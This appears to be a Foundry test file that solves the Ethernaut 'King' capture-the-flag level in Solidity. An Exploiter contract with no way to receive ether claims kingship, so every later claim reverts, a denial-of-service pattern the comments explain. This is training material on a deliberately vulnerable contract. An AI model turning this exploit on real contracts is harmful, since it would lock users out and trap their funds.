// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // As we said in the previous CTF challenge the only way to receive ether are via
        // 1) A receive function
        // 2) A payable fallback function
        // 3) "forced" by a selfdestruct that target our contract
        // What do you think that could happen in this case when the new king is a contract that cannot receive ether
        // and someone try to become the newest king?
        // The contract will revert because the previous king (our contract) have no way to receive the "treasury"!

        Exploiter exploiter = new Exploiter{value: level.prize() + 1}(payable(address(level)));

        assertEq(level._king(), address(exploiter));

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(address payable to) public payable {
        (bool success, ) = address(to).call{value: msg.value}("");
        require(success, "we are not the new king");
    }
}
